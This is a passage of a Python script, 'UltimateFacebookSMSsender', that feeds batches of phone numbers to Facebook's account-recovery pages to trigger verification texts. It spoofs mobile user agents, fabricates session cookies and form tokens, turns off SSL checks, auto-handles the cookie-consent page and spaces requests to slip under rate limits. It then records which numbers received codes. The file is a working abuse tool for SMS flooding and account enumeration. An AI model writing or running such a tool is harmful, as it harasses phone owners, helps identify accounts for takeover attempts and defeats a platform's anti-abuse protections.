import asyncio
import aiohttp
import json
import time
import random
import re
import os
import sys
import string
from datetime import datetime
from typing import List, Dict
import logging
from http.cookies import SimpleCookie

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class UltimateFacebookSMSsender:
    def __init__(self):
        self.session = None
        self.results = []
        self.stats = {
            'total': 0,
            'sms_confirmed': 0,
            'redirect_success': 0,
            'possible_sms': 0,
            'possible': 0,
            'failed': 0,
            'bad_request': 0,
            'timeout': 0,
            'cookie_consent': 0,
            'desktop_failed': 0
        }
        
        # Enhanced user agents - Mobile focus
        self.user_agents = [
            # Mobile Chrome - Highest priority
            'Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; SM-S906N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
            
            # iPhone
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
            
            # Desktop Chrome (backup)
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            
            # Firefox
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/121.0 Firefox/121.0',
        ]
        
        # Optimized endpoints - MBasic has highest priority
        self.endpoints = [
            {
                'url': 'https://mbasic.facebook.com/login/identify',
                'name': 'MBasic Facebook',
                'weight': 20,  # Highest priority
                'type': 'mbasic'
            },
            {
                'url': 'https://m.facebook.com/login/identify',
                'name': 'Mobile Facebook',
                'weight': 15,
                'type': 'mobile'
            },
            {
                'url': 'https://www.facebook.com/recover/initiate',
                'name': 'Facebook Recover',
                'weight': 10,
                'type': 'desktop'
            },
        ]
        
        # Pre-defined cookies to avoid consent
        self.default_cookies = {
            'locale': 'en_US',
            'sb': ''.join(random.choices(string.ascii_letters + string.digits, k=24)),
            'datr': ''.join(random.choices(string.ascii_letters + string.digits, k=24)),
            'fr': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'wd': '1920x1080',
        }
    
    async def create_session(self):
        """Create optimized session with cookies - FIXED VERSION"""
        try:
            connector = aiohttp.TCPConnector(
                ssl=False,
                limit=5,
                force_close=True,
                enable_cleanup_closed=True,
                ttl_dns_cache=300
            )
            
            timeout = aiohttp.ClientTimeout(
                total=90,
                connect=30,
                sock_read=60,
                sock_connect=30
            )
            
            # Create a simple cookie jar
            cookie_jar = aiohttp.CookieJar(unsafe=True)
            
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                cookie_jar=cookie_jar
            )
            
            # Add default cookies manually after session creation
            # We'll add them via headers instead
            self.session._default_headers = aiohttp.helpers.CIMultiDict()
            
            logger.info("✅ Session created successfully")
            return True
                
        except Exception as e:
            logger.error(f"❌ Session creation failed: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def clean_phone(self, phone: str) -> str:
        """Clean phone number and ensure + prefix for international format"""
        # Remove all non-digit characters first
        digits = re.sub(r'\D', '', phone)
        
        # If phone already starts with +, return as is
        if phone.strip().startswith('+'):
            return phone.strip()
        
        # If phone starts with 00 (international dialing code), replace with +
        if phone.strip().startswith('00'):
            digits_only = re.sub(r'\D', '', phone[2:])  # Remove 00 and non-digits
            return '+' + digits_only
        
        # For Tajikistan numbers (937)
        if digits.startswith('937') and 9 <= len(digits) <= 12:
            return '+' + digits
        
        # If it looks like a phone number, add +
        if 9 <= len(digits) <= 15:
            return '+' + digits
        
        # Return as digits only (no +)
        return digits
    
    def format_phone_for_display(self, phone: str) -> str:
        """Format phone number for display (with masking)"""
        cleaned = self.clean_phone(phone)
        if len(cleaned) > 8:
            return f"{cleaned[:4]}...{cleaned[-4:]}"
        return cleaned
    
    def generate_fingerprint(self):
        """Generate browser fingerprint"""
        timestamp = int(time.time() * 1000)
        random_part = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        return f"AV{random_part}{timestamp % 10000}"
    
    def get_endpoint_by_weight(self):
        """Get endpoint based on weight - MBasic has highest priority"""
        total_weight = sum(endpoint['weight'] for endpoint in self.endpoints)
        r = random.uniform(0, total_weight)
        cumulative = 0
        
        for endpoint in self.endpoints:
            cumulative += endpoint['weight']
            if r <= cumulative:
                return endpoint
        
        return self.endpoints[0]  # Fallback to MBasic
    
    def create_headers_for_endpoint(self, endpoint_type: str, user_agent: str) -> Dict:
        """Create optimized headers for each endpoint type"""
        base_headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        }
        
        # Add cookie headers
        cookie_parts = []
        for name, value in self.default_cookies.items():
            cookie_parts.append(f'{name}={value}')
        base_headers['Cookie'] = '; '.join(cookie_parts)
        
        if endpoint_type == 'mbasic':
            base_headers.update({
                'Origin': 'https://mbasic.facebook.com',
                'Referer': 'https://mbasic.facebook.com/login/identify',
                'Content-Type': 'application/x-www-form-urlencoded',
            })
        elif endpoint_type == 'mobile':
            base_headers.update({
                'Origin': 'https://m.facebook.com',
                'Referer': 'https://m.facebook.com/login/identify',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest',
            })
        elif endpoint_type == 'desktop':
            base_headers.update({
                'Origin': 'https://www.facebook.com',
                'Referer': 'https://www.facebook.com/login',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest',
            })
        
        return base_headers
    
    def create_form_data_for_endpoint(self, endpoint_type: str, formatted_phone: str) -> Dict:
        """Create optimized form data for each endpoint"""
        lsd_token = self.generate_fingerprint()
        
        base_data = {
            'lsd': lsd_token,
            'jazoest': '2816',
            'email': formatted_phone,
            'submit': 'Search',
            '__a': '1',
            '__req': str(random.randint(1, 20)),
            '__ajax__': '1',
            'locale': 'en_US',
        }
        
        if endpoint_type == 'mbasic':
            base_data.update({
                'did_submit': 'Search',
                'reset_action': '0',
                'n': '',
                'fb_dtsg': self.generate_fingerprint(),
            })
        elif endpoint_type == 'mobile':
            base_data.update({
                'did_submit': 'Search',
                'next': '',
                'ctx': 'recover',
                'c': '',
                'platform': 'www',
                'logger_source': 'www',
                'ajax_batch': '1',
                'fb_dtsg': self.generate_fingerprint(),
            })
        elif endpoint_type == 'desktop':
            base_data.update({
                'did_submit': 'Search',
                'next': '',
                'ctx': 'recover',
                'c': '',
                'platform': 'www',
                'logger_source': 'www',
                'ajax_batch': '1',
                'fb_dtsg': self.generate_fingerprint(),
            })
        
        return base_data
    
    async def handle_cookie_consent_redirect(self, redirect_url: str, headers: Dict) -> str:
        """Try to bypass cookie consent page"""
        try:
            if 'cookie/consent_prompt' in redirect_url:
                logger.info("🍪 Attempting to bypass cookie consent...")
                
                # Extract next_uri parameter
                match = re.search(r'next_uri=([^&]+)', redirect_url)
                if match:
                    next_uri = match.group(1)
                    decoded_uri = aiohttp.helpers.unquote(next_uri)
                    
                    # If it's a relative URL, make it absolute
                    if decoded_uri.startswith('/'):
                        if 'mbasic.facebook.com' in redirect_url:
                            return f"https://mbasic.facebook.com{decoded_uri}"
                        elif 'm.facebook.com' in redirect_url:
                            return f"https://m.facebook.com{decoded_uri}"
                        else:
                            return f"https://www.facebook.com{decoded_uri}"
                    
                    return decoded_uri
                
                # Try to follow the redirect and accept cookies
                async with self.session.get(redirect_url, headers=headers, allow_redirects=False) as resp:
                    if resp.status == 200:
                        html = await resp.text()
                        
                        # Look for form to accept cookies
                        if 'accept_only_essential' in html:
                            # Parse form data
                            form_data = {}
                            
                            # Find all hidden inputs
                            inputs = re.findall(r'<input[^>]*type="hidden"[^>]*>', html)
                            for inp in inputs:
                                name_match = re.search(r'name=[\'"]([^\'"]+)[\'"]', inp)
                                value_match = re.search(r'value=[\'"]([^\'"]+)[\'"]', inp)
                                if name_match and value_match:
                                    form_data[name_match.group(1)] = value_match.group(1)
                            
                            # Add accept parameter
                            form_data['accept_only_essential'] = '1'
                            
                            # Find form action
                            action_match = re.search(r'<form[^>]*action=[\'"]([^\'"]+)[\'"]', html)
                            if action_match:
                                action = action_match.group(1)
                                if not action.startswith('http'):
                                    if 'mbasic.facebook.com' in redirect_url:
                                        action = f"https://mbasic.facebook.com{action}"
                                
                                # Submit the form
                                async with self.session.post(
                                    action,
                                    headers=headers,
                                    data=form_data,
                                    allow_redirects=False
                                ) as post_resp:
                                    if post_resp.status in [302, 303, 307]:
                                        new_redirect = post_resp.headers.get('Location', '')
                                        return new_redirect
            
            return redirect_url
            
        except Exception as e:
            logger.error(f"🍪 Cookie consent bypass failed: {e}")
            return redirect_url
    
    async def send_sms_request(self, phone: str, endpoint_config: dict) -> Dict:
        """Send SMS request to specific endpoint - Optimized version"""
        # Clean and format phone with + prefix
        formatted_phone = self.clean_phone(phone)
        
        endpoint = endpoint_config['url']
        endpoint_name = endpoint_config['name']
        endpoint_type = endpoint_config.get('type', 'desktop')
        
        try:
            # Select appropriate user agent
            if endpoint_type in ['mbasic', 'mobile']:
                # Use mobile user agents for mobile endpoints
                mobile_agents = [ua for ua in self.user_agents if 'Mobile' in ua or 'Android' in ua or 'iPhone' in ua]
                user_agent = random.choice(mobile_agents) if mobile_agents else random.choice(self.user_agents)
            else:
                user_agent = random.choice(self.user_agents)
            
            # Create optimized headers and form data
            headers = self.create_headers_for_endpoint(endpoint_type, user_agent)
            form_data = self.create_form_data_for_endpoint(endpoint_type, formatted_phone)
            
            # Display formatted phone in log
            display_phone = self.format_phone_for_display(phone)
            logger.info(f"[{endpoint_name}] Sending to {display_phone} (as {formatted_phone})")
            
            # Send request
            start_time = time.time()
            
            async with self.session.post(
                endpoint,
                headers=headers,
                data=form_data,
                allow_redirects=False,
                timeout=30
            ) as response:
                
                response_time = time.time() - start_time
                status = response.status
                
                logger.info(f"[{endpoint_name}] Status: {status} ({response_time:.2f}s)")
                
                # Handle redirects
                if status in [302, 303, 307]:
                    redirect_url = response.headers.get('Location', '')
                    
                    # Try to bypass cookie consent
                    if 'cookie/consent_prompt' in redirect_url:
                        logger.info(f"[{endpoint_name}] Cookie consent redirect detected")
                        self.stats['cookie_consent'] += 1
                        
                        # Try to bypass it
                        bypassed_url = await self.handle_cookie_consent_redirect(redirect_url, headers)
                        
                        if bypassed_url != redirect_url and 'cookie/consent_prompt' not in bypassed_url:
                            logger.info(f"[{endpoint_name}] Cookie consent bypass successful")
                            redirect_url = bypassed_url
                    
                    # Log redirect destination
                    redirect_display = redirect_url[:100] + "..." if len(redirect_url) > 100 else redirect_url
                    logger.info(f"[{endpoint_name}] Redirect to: {redirect_display}")
                    
                    # Analyze redirect URL
                    recovery_keywords = [
                        'checkpoint', 'recover', 'verify', 'confirm', 
                        'password/reset', 'login/challenge', 'identify',
                        'send_code', 'sms', 'code'
                    ]
                    
                    has_recovery = any(keyword in redirect_url.lower() for keyword in recovery_keywords)
                    has_email_param = 'email=' in redirect_url
                    
                    if has_recovery or has_email_param:
                        # This is likely the SMS confirmation page
                        return {
                            'status': 'SMS_CONFIRMED',
                            'phone': phone,
                            'formatted_phone': formatted_phone,
                            'message': f'Redirect to recovery page',
                            'response_code': status,
                            'response_time': response_time,
                            'redirect_url': redirect_url,
                            'cookie_consent': 'cookie/consent_prompt' in redirect_url,
                            'endpoint': endpoint_name,
                            'user_agent': user_agent[:30] + "...",
                            'endpoint_type': endpoint_type
                        }
                    else:
                        # Generic redirect success
                        return {
                            'status': 'REDIRECT_SUCCESS',
                            'phone': phone,
                            'formatted_phone': formatted_phone,
                            'message': f'Redirect received',
                            'response_code': status,
                            'response_time': response_time,
                            'redirect_url': redirect_url,
                            'cookie_consent': 'cookie/consent_prompt' in redirect_url,
                            'endpoint': endpoint_name,
                            'user_agent': user_agent[:30] + "...",
                            'endpoint_type': endpoint_type
                        }
                
                # Handle 200 OK response
                elif status == 200:
                    try:
                        html = await response.text()
                        
                        # Check for SMS confirmation patterns
                        sms_patterns = [
                            (r'send.*?code.*?via.*?sms', 10, 'SMS_CONFIRMED'),
                            (r'sms.*?code.*?sent', 10, 'SMS_CONFIRMED'),
                            (r'text.*?message.*?sent', 10, 'SMS_CONFIRMED'),
                            (r'6-?digit.*?code.*?sent', 10, 'SMS_CONFIRMED'),
                            (r'verification.*?code.*?sent', 10, 'SMS_CONFIRMED'),
                            (r'enter.*?the.*?code.*?sent', 10, 'SMS_CONFIRMED'),
                            (r'check.*?your.*?phone.*?for.*?code', 10, 'SMS_CONFIRMED'),
                            (r'we.*?sent.*?code.*?to', 10, 'SMS_CONFIRMED'),
                            
                            (r'send.*?sms', 8, 'POSSIBLE_SMS'),
                            (r'sms.*?verification', 8, 'POSSIBLE_SMS'),
                            (r'phone.*?verification', 8, 'POSSIBLE_SMS'),
                            (r'mobile.*?verification', 8, 'POSSIBLE_SMS'),
                            (r'code.*?to.*?phone', 8, 'POSSIBLE_SMS'),
                            (r'text.*?to.*?phone', 8, 'POSSIBLE_SMS'),
                            
                            (r'checkpoint', 6, 'POSSIBLE'),
                            (r'verify.*?phone', 6, 'POSSIBLE'),
                            (r'confirm.*?phone', 6, 'POSSIBLE'),
                            (r'recover.*?password', 6, 'POSSIBLE'),
                            (r'reset.*?password', 6, 'POSSIBLE'),
                            (r'account.*?recovery', 6, 'POSSIBLE'),
                            (r'find.*?your.*?account', 6, 'POSSIBLE'),
                        ]
                        
                        max_score = 0
                        best_status = 'NO_MATCH'
                        found_patterns = []
                        
                        for pattern, score, pattern_status in sms_patterns:
                            if re.search(pattern, html, re.IGNORECASE):
                                if score > max_score:
                                    max_score = score
                                    best_status = pattern_status
                                found_patterns.append(pattern.replace(r'.*?', ' ').replace('\\', '')[:30])
                        
                        # Check for cookie consent page
                        if 'cookie/consent_prompt' in html or 'cookie_policy' in html:
                            self.stats['cookie_consent'] += 1
                            best_status = 'COOKIE_CONSENT'
                            max_score = 5
                        
                        if max_score >= 10:
                            return {
                                'status': 'SMS_CONFIRMED',
                                'phone': phone,
                                'formatted_phone': formatted_phone,
                                'message': f'Strong SMS indicators (score: {max_score})',
                                'response_code': status,
                                'response_time': response_time,
                                'score': max_score,
                                'patterns': found_patterns[:3],
                                'endpoint': endpoint_name,
                                'user_agent': user_agent[:30] + "...",
                                'endpoint_type': endpoint_type
                            }
                        elif max_score >= 8:
                            return {
                                'status': 'POSSIBLE_SMS',
                                'phone': phone,
                                'formatted_phone': formatted_phone,
                                'message': f'Possible SMS indicators (score: {max_score})',
                                'response_code': status,
                                'response_time': response_time,
                                'score': max_score,
                                'patterns': found_patterns[:3],
                                'endpoint': endpoint_name,
                                'user_agent': user_agent[:30] + "...",
                                'endpoint_type': endpoint_type
                            }
                        elif max_score >= 5:
                            return {
                                'status': 'POSSIBLE',
                                'phone': phone,
                                'formatted_phone': formatted_phone,
                                'message': f'Some indicators found (score: {max_score})',
                                'response_code': status,
                                'response_time': response_time,
                                'score': max_score,
                                'patterns': found_patterns[:3],
                                'endpoint': endpoint_name,
                                'user_agent': user_agent[:30] + "...",
                                'endpoint_type': endpoint_type
                            }
                        else:
                            # Check if it's a Facebook page at all
                            if 'facebook' in html.lower() and len(html) > 500:
                                return {
                                    'status': 'POSSIBLE',
                                    'phone': phone,
                                    'formatted_phone': formatted_phone,
                                    'message': 'Facebook page loaded',
                                    'response_code': status,
                                    'response_time': response_time,
                                    'endpoint': endpoint_name,
                                    'user_agent': user_agent[:30] + "...",
                                    'endpoint_type': endpoint_type
                                }
                            else:
                                return {
                                    'status': 'NO_MATCH',
                                    'phone': phone,
                                    'formatted_phone': formatted_phone,
                                    'message': 'No matching patterns found',
                                    'response_code': status,
                                    'response_time': response_time,
                                    'endpoint': endpoint_name,
                                    'user_agent': user_agent[:30] + "...",
                                    'endpoint_type': endpoint_type
                                }
                                
                    except Exception as e:
                        logger.error(f"[{endpoint_name}] HTML analysis error: {e}")
                        return {
                            'status': 'ANALYSIS_ERROR',
                            'phone': phone,
                            'formatted_phone': formatted_phone,
                            'message': f'Analysis failed: {str(e)[:50]}',
                            'response_code': status,
                            'response_time': response_time,
                            'endpoint': endpoint_name,
                            'user_agent': user_agent[:30] + "...",
                            'endpoint_type': endpoint_type
                        }
                
                # Handle 400 Bad Request
                elif status == 400:
                    self.stats['bad_request'] += 1
                    return {
                        'status': 'BAD_REQUEST',
                        'phone': phone,
                        'formatted_phone': formatted_phone,
                        'message': '400 Bad Request',
                        'response_code': status,
                        'response_time': response_time,
                        'endpoint': endpoint_name,
                        'user_agent': user_agent[:30] + "...",
                        'endpoint_type': endpoint_type
                    }
                
                # Handle 403 Forbidden
                elif status == 403:
                    if endpoint_type == 'desktop':
                        self.stats['desktop_failed'] += 1
                    return {
                        'status': 'FORBIDDEN',
                        'phone': phone,
                        'formatted_phone': formatted_phone,
                        'message': '403 Forbidden (IP might be blocked)',
                        'response_code': status,
                        'response_time': response_time,
                        'endpoint': endpoint_name,
                        'user_agent': user_agent[:30] + "...",
                        'endpoint_type': endpoint_type
                    }
                
                # Handle 429 Too Many Requests
                elif status == 429:
                    return {
                        'status': 'RATE_LIMITED',
                        'phone': phone,
                        'formatted_phone': formatted_phone,
                        'message': '429 Rate Limited',
                        'response_code': status,
                        'response_time': response_time,
                        'endpoint': endpoint_name,
                        'user_agent': user_agent[:30] + "...",
                        'endpoint_type': endpoint_type
                    }
                
                # Handle other status codes
                else:
                    return {
                        'status': f'HTTP_{status}',
                        'phone': phone,
                        'formatted_phone': formatted_phone,
                        'message': f'HTTP Status: {status}',
                        'response_code': status,
                        'response_time': response_time,
                        'endpoint': endpoint_name,
                        'user_agent': user_agent[:30] + "...",
                        'endpoint_type': endpoint_type
                    }
                    
        except asyncio.TimeoutError:
            logger.warning(f"[{endpoint_name}] Timeout for {phone}")
            self.stats['timeout'] += 1
            return {
                'status': 'TIMEOUT',
                'phone': phone,
                'formatted_phone': formatted_phone,
                'message': 'Request timeout',
                'endpoint': endpoint_name,
                'endpoint_type': endpoint_type
            }
            
        except aiohttp.ClientError as e:
            error_msg = str(e)
            logger.error(f"[{endpoint_name}] Client error: {error_msg[:100]}")
            
            if endpoint_type == 'desktop':
                self.stats['desktop_failed'] += 1
            
            return {
                'status': 'CLIENT_ERROR',
                'phone': phone,
                'formatted_phone': formatted_phone,
                'message': f'Client error: {error_msg[:100]}',
                'endpoint': endpoint_name,
                'endpoint_type': endpoint_type
            }
            
        except Exception as e:
            error_msg = str(e)
            logger.error(f"[{endpoint_name}] Error: {error_msg[:100]}")
            return {
                'status': 'ERROR',
                'phone': phone,
                'formatted_phone': formatted_phone,
                'message': f'Exception: {error_msg[:100]}',
                'endpoint': endpoint_name,
                'endpoint_type': endpoint_type
            }
    
    async def process_single_phone(self, phone: str, attempt: int = 1) -> Dict:
        """Process single phone with smart retry logic"""
        formatted_phone = self.clean_phone(phone)
        
        logger.info(f"\n{'='*50}")
        logger.info(f"📱 [{self.stats['total'] + 1}] Processing: {phone}")
        logger.info(f"   Formatted as: {formatted_phone}")
        logger.info(f"{'='*50}")
        
        max_attempts = 2
        best_result = None
        
        for attempt_num in range(1, max_attempts + 1):
            if attempt_num > 1:
                logger.info(f"   ↪ Attempt {attempt_num}/{max_attempts}...")
                await asyncio.sleep(random.uniform(3, 8))
            
            # Select endpoint
            endpoint_config = self.get_endpoint_by_weight()
            
            # Skip if this endpoint type failed too many times
            if endpoint_config['type'] == 'desktop' and self.stats['desktop_failed'] > 5:
                logger.info(f"   Skipping desktop endpoint due to many failures")
                continue
            
            # Send request
            result = await self.send_sms_request(phone, endpoint_config)
            
            # Update best result
            if best_result is None:
                best_result = result
            else:
                # Compare status priority
                status_priority = {
                    'SMS_CONFIRMED': 100,
                    'REDIRECT_SUCCESS': 90,
                    'POSSIBLE_SMS': 80,
                    'POSSIBLE': 70,
                    'COOKIE_CONSENT': 65,
                    'NO_MATCH': 60,
                    'ANALYSIS_ERROR': 50,
                    'TIMEOUT': 40,
                    'BAD_REQUEST': 30,
                    'FORBIDDEN': 20,
                    'RATE_LIMITED': 10,
                    'CLIENT_ERROR': 5,
                    'ERROR': 0,
                }
                
                current_priority = status_priority.get(best_result['status'], 0)
                new_priority = status_priority.get(result['status'], 0)
                
                if new_priority > current_priority:
                    best_result = result
            
            # If we got a good result, break early
            if result['status'] in ['SMS_CONFIRMED', 'REDIRECT_SUCCESS']:
                break
        
        # Add attempt info
        if best_result:
            best_result['attempts'] = attempt_num
            best_result['timestamp'] = datetime.now().isoformat()
        else:
            best_result = {
                'status': 'ALL_ATTEMPTS_FAILED',
                'phone': phone,
                'formatted_phone': formatted_phone,
                'message': 'All attempts failed',
                'attempts': max_attempts,
                'timestamp': datetime.now().isoformat()
            }
        
        return best_result
    
    async def process_batch(self, phones: List[str], delay: int = 90, batch_size: int = 3):
        """Process batch of phones"""
        print(f"\n{'='*70}")
        print("🚀 ULTIMATE FACEBOOK SMS SENDER - OPTIMIZED BATCH PROCESSING")
        print(f"{'='*70}")
        print(f"📱 Total numbers: {len(phones)}")
        print(f"🔢 Format: All numbers will be sent with + prefix")
        print(f"📱 Primary endpoint: MBasic Facebook (Mobile optimized)")
        print(f"🍪 Cookie consent bypass: ENABLED")
        print(f"⏱️  Delay: {delay} seconds")
        print(f"📦 Batch size: {batch_size}")
        print(f"🕐 Start: {datetime.now().strftime('%H:%M:%S')}")
        print(f"📊 Estimated: {len(phones) * delay / 60:.1f} minutes")
        print(f"{'='*70}")
        
        # Create session
        if not await self.create_session():
            print("❌ Failed to create session")
            return
        
        start_time = time.time()
        
        try:
            # Process in small batches
            total_batches = (len(phones) + batch_size - 1) // batch_size
            
            for batch_num in range(total_batches):
                batch_start = batch_num * batch_size
                batch_end = min(batch_start + batch_size, len(phones))
                batch = phones[batch_start:batch_end]
                
                print(f"\n📦 BATCH {batch_num + 1}/{total_batches}")
                print(f"   Numbers {batch_start + 1}-{batch_end}")
                print(f"   Size: {len(batch)} numbers")
                
                batch_start_time = time.time()
                
                # Process each number in batch
                for i, phone in enumerate(batch):
                    absolute_idx = batch_start + i + 1
                    
                    # Process phone
                    result = await self.process_single_phone(phone)
                    self.results.append(result)
                    self.stats['total'] += 1
                    
                    # Update stats
                    status = result['status']
                    formatted_phone = result.get('formatted_phone', phone)
                    endpoint_type = result.get('endpoint_type', 'unknown')
                    
                    if status == 'SMS_CONFIRMED':
                        self.stats['sms_confirmed'] += 1
                        if result.get('cookie_consent'):
                            status_emoji = "🍪✅"
                        else:
                            status_emoji = "📱✅"
                    elif status == 'REDIRECT_SUCCESS':
                        self.stats['redirect_success'] += 1
                        if result.get('cookie_consent'):
                            status_emoji = "🍪🔄"
                        else:
                            status_emoji = "🔄✅"
                    elif status == 'POSSIBLE_SMS':
                        self.stats['possible_sms'] += 1
                        status_emoji = "📱⚠️"
                    elif status == 'POSSIBLE':
                        self.stats['possible'] += 1
                        status_emoji = "⚠️"
                    elif status == 'COOKIE_CONSENT':
                        status_emoji = "🍪"
                        self.stats['possible'] += 1
                    elif status == 'BAD_REQUEST':
                        self.stats['bad_request'] += 1
                        status_emoji = "❌"
                    elif status == 'TIMEOUT':
                        self.stats['timeout'] += 1
                        status_emoji = "⏱️❌"
                    else:
                        self.stats['failed'] += 1
                        status_emoji = "❌"
                    
                    # Add endpoint type indicator
                    endpoint_indicator = ""
                    if endpoint_type == 'mbasic':
                        endpoint_indicator = "📱"
                    elif endpoint_type == 'mobile':
                        endpoint_indicator = "📲"
                    elif endpoint_type == 'desktop':
                        endpoint_indicator = "💻"
                    
                    print(f"   {status_emoji}{endpoint_indicator} [{absolute_idx}] {formatted_phone}: {status}")
                    
                    # Save progress periodically
                    if absolute_idx % 5 == 0:
                        self.save_progress()
                    
                    # Small delay between numbers in batch
                    if i < len(batch) - 1:
                        small_delay = random.uniform(2, 6)
                        await asyncio.sleep(small_delay)
                
                # Calculate batch time
                batch_time = time.time() - batch_start_time
                
                # Show batch stats
                self.show_batch_stats(batch_end)
                
                # Long delay between batches
                if batch_end < len(phones):
                    remaining_delay = max(30, delay - batch_time)
                    
                    print(f"\n🔄 Batch completed in {batch_time:.1f}s")
                    print(f"⏳ Next batch in {remaining_delay:.1f}s...")
                    
                    # Countdown
                    for sec in range(int(remaining_delay), 0, -15):
                        if sec <= 60 or sec % 30 == 0:
                            remaining_total = self.calculate_remaining_time(batch_end, len(phones), delay)
                            print(f"   {sec}s remaining... {remaining_total}")
                        await asyncio.sleep(min(15, sec))
            
            # Final summary
            total_time = time.time() - start_time
            self.show_final_summary(total_time)
            self.save_final_results()
            
        except KeyboardInterrupt:
            print("\n\n⏹️  Process interrupted")
            self.save_progress()
        except Exception as e:
            print(f"\n❌ Error: {e}")
            import traceback
            traceback.print_exc()
        finally:
            await self.session.close()
    
    def calculate_remaining_time(self, processed: int, total: int, delay: float) -> str:
        """Calculate remaining time"""
        remaining = total - processed
        seconds = remaining * delay
        
        if seconds < 60:
            return f"{int(seconds)}s"
        elif seconds < 3600:
            return f"{int(seconds/60)}m {int(seconds%60)}s"
        else:
            hours = int(seconds/3600)
            minutes = int((seconds % 3600)/60)
            return f"{hours}h {minutes}m"
    
    def show_batch_stats(self, processed: int):
        """Show batch statistics"""
        total = self.stats['total']
        
        if total == 0:
            return
        
        print(f"\n📊 BATCH STATISTICS:")
        print(f"   Processed: {processed}/{len(self.results)}")
        
        success_total = (self.stats['sms_confirmed'] + self.stats['redirect_success'] + 
                        self.stats['possible_sms'] + self.stats['possible'])
        
        success_rate = (success_total / total) * 100
        
        print(f"   📱✅ SMS Confirmed: {self.stats['sms_confirmed']}")
        print(f"   🔄✅ Redirect Success: {self.stats['redirect_success']}")
        print(f"   📱⚠️  Possible SMS: {self.stats['possible_sms']}")
        print(f"   ⚠️  Possible: {self.stats['possible']}")
        print(f"   🍪 Cookie Consent Pages: {self.stats['cookie_consent']}")
        print(f"   💻 Desktop Failures: {self.stats['desktop_failed']}")
        print(f"   ❌ Failed: {self.stats['failed']}")
        print(f"   📈 Success Rate: {success_rate:.1f}%")
        
        # Show recent statuses
        if len(self.results) >= 5:
            recent = self.results[-5:]
            print(f"   Recent: ", end="")
            for r in recent:
                status = r['status']
                endpoint_type = r.get('endpoint_type', '')
                
                if status == 'SMS_CONFIRMED':
                    print("📱", end=" ")
                elif status == 'REDIRECT_SUCCESS':
                    if r.get('cookie_consent'):
                        print("🍪", end=" ")
                    else:
                        print("🔄", end=" ")
                elif status == 'POSSIBLE_SMS':
                    print("⚠️", end=" ")
                elif status == 'COOKIE_CONSENT':
                    print("🍪", end=" ")
                elif 'POSSIBLE' in status:
                    print("•", end=" ")
                else:
                    print("✗", end=" ")
            print()
    
    def save_progress(self):
        """Save progress to file"""
        try:
            progress_data = {
                'timestamp': datetime.now().isoformat(),
                'stats': self.stats,
                'total_processed': len(self.results),
                'recent_results': self.results[-20:] if len(self.results) > 20 else self.results
            }
            
            with open("progress.json", "w", encoding="utf-8") as f:
                json.dump(progress_data, f, indent=2, ensure_ascii=False, default=str)
            
            # Also save readable version
            with open("progress.txt", "w", encoding="utf-8") as f:
                f.write(f"Progress at {datetime.now().strftime('%H:%M:%S')}\n")
                f.write(f"Processed: {self.stats['total']}\n")
                f.write(f"SMS Confirmed: {self.stats['sms_confirmed']}\n")
                f.write(f"Redirect Success: {self.stats['redirect_success']}\n")
                f.write(f"Possible SMS: {self.stats['possible_sms']}\n")
                f.write(f"Possible: {self.stats['possible']}\n")
                f.write(f"Cookie Consent Pages: {self.stats['cookie_consent']}\n")
                f.write(f"Desktop Failures: {self.stats['desktop_failed']}\n")
                f.write(f"Failed: {self.stats['failed']}\n")
                f.write("="*50 + "\n\n")
                
                for result in self.results[-10:]:
                    phone = result.get('formatted_phone', result['phone'])
                    status = result['status']
                    endpoint_type = result.get('endpoint_type', '')
                    
                    if status == 'SMS_CONFIRMED':
                        if result.get('cookie_consent'):
                            f.write(f"🍪✅ {phone} ({endpoint_type})\n")
                        else:
                            f.write(f"📱✅ {phone} ({endpoint_type})\n")
                    elif status == 'REDIRECT_SUCCESS':
                        if result.get('cookie_consent'):
                            f.write(f"🍪🔄 {phone} ({endpoint_type})\n")
                        else:
                            f.write(f"🔄✅ {phone} ({endpoint_type})\n")
                    elif status == 'POSSIBLE_SMS':
                        f.write(f"📱⚠️  {phone} ({endpoint_type})\n")
                    elif status == 'COOKIE_CONSENT':
